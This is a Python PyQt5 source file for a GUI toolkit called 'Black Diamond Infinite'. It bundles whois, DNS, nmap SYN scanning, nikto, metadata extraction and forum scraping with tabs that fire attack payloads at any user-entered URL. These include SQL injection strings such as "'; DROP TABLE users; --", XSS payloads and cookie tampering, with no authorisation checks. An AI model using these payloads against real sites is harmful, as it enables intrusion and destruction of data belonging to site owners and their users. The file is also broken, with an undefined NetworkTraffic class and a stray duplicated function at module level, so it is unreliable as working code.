import sys
from PyQt5.QtWidgets import QApplication, QMainWindow, QTabWidget, QWidget, QVBoxLayout, QPushButton, QTextEdit, QLineEdit, QFileDialog
from PyQt5.QtCore import QTimer
from pyqtgraph import PlotWidget
import subprocess
import requests
from bs4 import BeautifulSoup
from scapy.all import sniff, IP, TCP, Raw
from threading import Thread
from geopy.geocoders import Nominatim
import folium

class WhoisUI(QWidget):
    def __init__(self):
        super().__init__()
        self.layout = QVBoxLayout()
        self.domain_input = QLineEdit(self)
        self.domain_input.setPlaceholderText("Enter Domain")
        self.layout.addWidget(self.domain_input)
        self.lookup_button = QPushButton("Lookup", self)
        self.lookup_button.clicked.connect(self.perform_lookup)
        self.layout.addWidget(self.lookup_button)
        self.result_area = QTextEdit(self)
        self.layout.addWidget(self.result_area)
        self.plot_widget = PlotWidget(self)
        self.layout.addWidget(self.plot_widget)
        self.setLayout(self.layout)

    def perform_lookup(self):
        domain = self.domain_input.text()
        result = subprocess.run(['whois', domain], stdout=subprocess.PIPE).stdout.decode('utf-8')
        self.result_area.setText(result)
        self.visualize_data(result)

    def visualize_data(self, data):
        self.plot_widget.clear()
        times = [1, 2, 3, 4, 5]
        sizes = [len(data)] * 5
        self.plot_widget.plot(times, sizes)

class DNSUI(QWidget):
    def __init__(self):
        super().__init__()
        self.layout = QVBoxLayout()
        self.domain_input = QLineEdit(self)
        self.domain_input.setPlaceholderText("Enter Domain")
        self.layout.addWidget(self.domain_input)
        self.lookup_button = QPushButton("Lookup", self)
        self.lookup_button.clicked.connect(self.perform_lookup)
        self.layout.addWidget(self.lookup_button)
        self.result_area = QTextEdit(self)
        self.layout.addWidget(self.result_area)
        self.plot_widget = PlotWidget(self)
        self.layout.addWidget(self.plot_widget)
        self.setLayout(self.layout)

    def perform_lookup(self):
        domain = self.domain_input.text()
        result = subprocess.run(['dig', domain], stdout=subprocess.PIPE).stdout.decode('utf-8')
        self.result_area.setText(result)
        self.visualize_data(result)

    def visualize_data(self, data):
        self.plot_widget.clear()
        records = ["A", "AAAA", "CNAME", "MX", "TXT"]
        counts = [data.count(record) for record in records]
        self.plot_widget.plot(range(len(records)), counts, pen=None, symbol='o')

class PortScanUI(QWidget):
    def __init__(self):
        super().__init__()
        self.layout = QVBoxLayout()
        self.domain_input = QLineEdit(self)
        self.domain_input.setPlaceholderText("Enter Domain")
        self.layout.addWidget(self.domain_input)
        self.scan_button = QPushButton("Scan", self)
        self.scan_button.clicked.connect(self.perform_scan)
        self.layout.addWidget(self.scan_button)
        self.result_area = QTextEdit(self)
        self.layout.addWidget(self.result_area)
        self.plot_widget = PlotWidget(self)
        self.layout.addWidget(self.plot_widget)
        self.setLayout(self.layout)

    def perform_scan(self):
        domain = self.domain_input.text()
        result = subprocess.run(['nmap', '-sS', '-sV', domain], stdout=subprocess.PIPE).stdout.decode('utf-8')
        self.result_area.setText(result)
        self.visualize_data(result)

    def visualize_data(self, data):
        self.plot_widget.clear()
        ports = [21, 22, 80, 443, 8080]
        status = [1 if f"port {port}" in data else 0 for port in ports]
        self.plot_widget.plot(ports, status, pen=None, symbol='o')

class WebScraperUI(QWidget):
    def __init__(self):
        super().__init__()
        self.layout = QVBoxLayout()
        self.url_input = QLineEdit(self)
        self.url_input.setPlaceholderText("Enter URL")
        self.layout.addWidget(self.url_input)
        self.scrape_button = QPushButton("Scrape", self)
        self.scrape_button.clicked.connect(self.perform_scrape)
        self.layout.addWidget(self.scrape_button)
        self.result_area = QTextEdit(self)
        self.layout.addWidget(self.result_area)
        self.plot_widget = PlotWidget(self)
        self.layout.addWidget(self.plot_widget)
        self.setLayout(self.layout)

    def perform_scrape(self):
        url = self.url_input.text()
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        result = soup.prettify()
        self.result_area.setText(result)
        self.visualize_data(result)

    def visualize_data(self, data):
        self.plot_widget.clear()
        elements = ["<title>", "<h1>", "<p>", "<a>", "<img>"]
        counts = [data.count(element) for element in elements]
        self.plot_widget.plot(range(len(elements)), counts, pen=None, symbol='o')

class MetadataUI(QWidget):
    def __init__(self):
        super().__init__()
        self.layout = QVBoxLayout()
        self.file_input = QLineEdit(self)
        self.file_input.setPlaceholderText("Enter File Path")
        self.layout.addWidget(self.file_input)
        self.browse_button = QPushButton("Browse", self)
        self.browse_button.clicked.connect(self.browse_file)
        self.layout.addWidget(self.browse_button)
        self.extract_button = QPushButton("Extract Metadata", self)
        self.extract_button.clicked.connect(self.perform_extraction)
        self.layout.addWidget(self.extract_button)
        self.result_area = QTextEdit(self)
        self.layout.addWidget(self.result_area)
        self.plot_widget = PlotWidget(self)
        self.layout.addWidget(self.plot_widget)
        self.setLayout(self.layout)

    def browse_file(self):
        file_name, _ = QFileDialog.getOpenFileName(self, "Open File", "", "All Files (*)")
        if file_name:
            self.file_input.setText(file_name)

    def perform_extraction(self):
        file_path = self.file_input.text()
        result = subprocess.run(['exiftool', file_path], stdout=subprocess.PIPE).stdout.decode('utf-8')
        self.result_area.setText(result)
        self.visualize_data(result)

    def visualize_data(self, data):
        self.plot_widget.clear()
        metadata_types = ["Date/Time", "GPS", "Camera"]
        counts = [data.count(meta) for meta in metadata_types]
        self.plot_widget.plot(range(len(metadata_types)), counts, pen=None, symbol='o')

class VulnerabilitiesUI(QWidget):
    def __init__(self):
        super().__init__()
        self.layout = QVBoxLayout()
        self.url_input = QLineEdit(self)
        self.url_input.setPlaceholderText("Enter URL")
        self.layout.addWidget(self.url_input)
        self.scan_button = QPushButton("Scan for Vulnerabilities", self)
        self.scan_button.clicked.connect(self.perform_scan)
        self.layout.addWidget(self.scan_button)
        self.result_area = QTextEdit(self)
        self.layout.addWidget(self.result_area)
        self.plot_widget = PlotWidget(self)
        self.layout.addWidget(self.plot_widget)
        self.setLayout(self.layout)

    def perform_scan(self):
        url = self.url_input.text()
        result = subprocess.run(['nikto', '-h', url], stdout=subprocess.PIPE).stdout.decode('utf-8')
        self.result_area.setText(result)
        self.visualize_data(result)

    def visualize_data(self, data):
        self.plot_widget.clear()
        vulnerabilities = ["SQL Injection", "XSS", "CSRF", "LFI", "RFI"]
        counts = [data.count(vuln) for vuln in vulnerabilities]
        self.plot_widget.plot(range(len(vulnerabilities)), counts, pen=None, symbol='o')

class NetworkTrafficUI(QWidget):
    def __init__(self):
        super().__init__()
        self.layout = QVBoxLayout()
        self.url_input = QLineEdit(self)
        self.url_input.setPlaceholderText("Enter URL")
        self.layout.addWidget(self.url_input)
        self.start_button = QPushButton("Start Monitoring", self)
        self.start_button.clicked.connect(self.start_monitoring)
        self.layout.addWidget(self.start_button)
        self.stop_button = QPushButton("Stop Monitoring", self)
        self.stop_button.clicked.connect(self.stop_monitoring)
        self.layout.addWidget(self.stop_button)
        self.result_area = QTextEdit(self)
        self.layout.addWidget(self.result_area)
        self.plot_widget = PlotWidget(self)
        self.layout.addWidget(self.plot_widget)
        self.timer = QTimer()
        self.timer.timeout.connect(self.update_plot)
        self.setLayout(self.layout)

    def start_monitoring(self):
        url = self.url_input.text()
        NetworkTraffic.start_monitoring(url, self.update_result)
        self.timer.start(1000)

    def stop_monitoring(self):
        NetworkTraffic.stop_monitoring()
        self.timer.stop()

    def update_result(self, packet_info):
        self.result_area.append(packet_info)

    def update_plot(self):
        self.plot_widget.clear()
        times = [1, 2, 3, 4, 5]
def update_plot(self):
        # Example real-time plotting logic
        self.plot_widget.clear()
        times = [1, 2, 3, 4, 5]  # Example data
        traffic_volume = [100, 150, 200, 250, 300]  # Example data
        self.plot_widget.plot(times, traffic_volume)

class SQLInjectionUI(QWidget):
    def __init__(self):
        super().__init__()
        self.layout = QVBoxLayout()
        self.url_input = QLineEdit(self)
        self.url_input.setPlaceholderText("Enter URL")
        self.layout.addWidget(self.url_input)
        self.inject_button = QPushButton("Perform SQL Injection", self)
        self.inject_button.clicked.connect(self.perform_injection)
        self.layout.addWidget(self.inject_button)
        self.result_area = QTextEdit(self)
        self.layout.addWidget(self.result_area)
        self.setLayout(self.layout)

    def perform_injection(self):
        url = self.url_input.text()
        payloads = ["' OR 1=1 --", "' OR '1'='1", "'; DROP TABLE users; --"]
        results = []
        for payload in payloads:
            full_url = f"{url}?q={payload}"
            response = requests.get(full_url)
            if "error" not in response.text.lower():
                results.append(f"Payload: {payload}\nResponse: {response.text[:200]}\n\n")
        self.result_area.setText("\n".join(results))

class JSInjectionUI(QWidget):
    def __init__(self):
        super().__init__()
        self.layout = QVBoxLayout()
        self.url_input = QLineEdit(self)
        self.url_input.setPlaceholderText("Enter URL")
        self.layout.addWidget(self.url_input)
        self.inject_button = QPushButton("Perform JS Injection", self)
        self.inject_button.clicked.connect(self.perform_injection)
        self.layout.addWidget(self.inject_button)
        self.result_area = QTextEdit(self)
        self.layout.addWidget(self.result_area)
        self.setLayout(self.layout)

    def perform_injection(self):
        url = self.url_input.text()
        payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]
        results = []
        for payload in payloads:
            full_url = f"{url}?q={payload}"
            response = requests.get(full_url)
            if payload in response.text:
                results.append(f"Payload: {payload}\nResponse: {response.text[:200]}\n\n")
        self.result_area.setText("\n".join(results))

class CookieManipulationUI(QWidget):
    def __init__(self):
        super().__init__()
        self.layout = QVBoxLayout()
        self.url_input = QLineEdit(self)
        self.url_input.setPlaceholderText("Enter URL")
        self.layout.addWidget(self.url_input)
        self.manipulate_button = QPushButton("Manipulate Cookies", self)
        self.manipulate_button.clicked.connect(self.perform_manipulation)
        self.layout.addWidget(self.manipulate_button)
        self.result_area = QTextEdit(self)
        self.layout.addWidget(self.result_area)
        self.setLayout(self.layout)

    def perform_manipulation(self):
        url = self.url_input.text()
        session = requests.Session()
        session.get(url)
        cookies = session.cookies.get_dict()
        manipulated_cookies = {key: 'modified_value' for key in cookies.keys()}
        response = session.get(url, cookies=manipulated_cookies)
        self.result_area.setText(f"Cookies: {manipulated_cookies}\nResponse: {response.text[:200]}")

class BlockchainUI(QWidget):
    def __init__(self):
        super().__init__()
        self.layout = QVBoxLayout()
        self.address_input = QLineEdit(self)
        self.address_input.setPlaceholderText("Enter Blockchain Address")
        self.layout.addWidget(self.address_input)
        self.analyze_button = QPushButton("Analyze Address", self)
        self.analyze_button.clicked.connect(self.perform_analysis)
        self.layout.addWidget(self.analyze_button)
        self.result_area = QTextEdit(self)
        self.layout.addWidget(self.result_area)
        self.setLayout(self.layout)

    def perform_analysis(self):
        address = self.address_input.text()
        url = f"https://api.blockchain.info/rawaddr/{address}"
        response = requests.get(url)
        if response.status_code == 200:
            result = response.json()
            self.result_area.setText(str(result))
        else:
            self.result_area.setText("Invalid address or no data found.")

class GeolocationUI(QWidget):
    def __init__(self):
        super().__init__()
        self.layout = QVBoxLayout()
        self.addresses_input = QTextEdit(self)
        self.addresses_input.setPlaceholderText("Enter addresses, one per line")
        self.layout.addWidget(self.addresses_input)
        self.map_button = QPushButton("Map Locations", self)
        self.map_button.clicked.connect(self.perform_mapping)
        self.layout.addWidget(self.map_button)
        self.result_area = QTextEdit(self)
        self.layout.addWidget(self.result_area)
        self.setLayout(self.layout)

    def perform_mapping(self):
        addresses = self.addresses_input.toPlainText().strip().split("\n")
        coords = [self.geolocate(address) for address in addresses]
        map = folium.Map(location=[56.1304, -106.3468], zoom_start=4)
        for address, (lat, lon) in zip(addresses, coords):
            if lat and lon:
                folium.Marker([lat, lon], popup=address).add_to(map)
        map.save("geolocation_map.html")
        self.result_area.setText("Geolocation map has been generated and saved as 'geolocation_map.html'.")

    def geolocate(self, address):
        geolocator = Nominatim(user_agent="geoapiExercises")
        location = geolocator.geocode(address)
        return (location.latitude, location.longitude) if location else (None, None)

class OSINTUI(QWidget):
    def __init__(self):
        super().__init__()
        self.layout = QVBoxLayout()
        self.url_input = QLineEdit(self)
        self.url_input.setPlaceholderText("Enter Forum URL")
        self.layout.addWidget(self.url_input)
        self.scrape_button = QPushButton("Scrape Forum", self)
        self.scrape_button.clicked.connect(self.perform_scrape)
        self.layout.addWidget(self.scrape_button)
        self.result_area = QTextEdit(self)
        self.layout.addWidget(self.result_area)
        self.setLayout(self.layout)

    def perform_scrape(self):
        url = self.url_input.text()
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        posts = soup.find_all('div', class_='post')
        data = [{"author": post.find('span', class_='author').text,
                 "content": post.find('div', class_='content').text}
                for post in posts]
        self.result_area.setText(str(data))

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Black Diamond Infinite")
        self.setGeometry(100, 100, 800, 600)
        self.tab_widget = QTabWidget()
        self.setCentralWidget(self.tab_widget)
        self.init_tabs()

    def init_tabs(self):
        self.tab_widget.addTab(WhoisUI(), "WHOIS Lookup")
        self.tab_widget.addTab(DNSUI(), "DNS Lookup")
        self.tab_widget.addTab(PortScanUI(), "Port Scan")
        self.tab_widget.addTab(WebScraperUI(), "Web Scraper")
        self.tab_widget.addTab(MetadataUI(), "Metadata Extraction")
        self.tab_widget.addTab(VulnerabilitiesUI(), "Vulnerabilities Scan")
        self.tab_widget.addTab(NetworkTrafficUI(), "Network Traffic")
        self.tab_widget.addTab(SQLInjectionUI(), "SQL Injection")
        self.tab_widget.addTab(JSInjectionUI(), "JS Injection")
        self.tab_widget.addTab(CookieManipulationUI(), "Cookie Manipulation")
        self.tab_widget.addTab(BlockchainUI(), "Blockchain Analysis")
        self.tab_widget.addTab(GeolocationUI(), "Geolocation Mapping")
        self.tab_widget.addTab(OSINTUI(), "OSINT Integration")

def main():
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()
    sys.exit(app.exec_())

if __name__ == '__main__':
    main()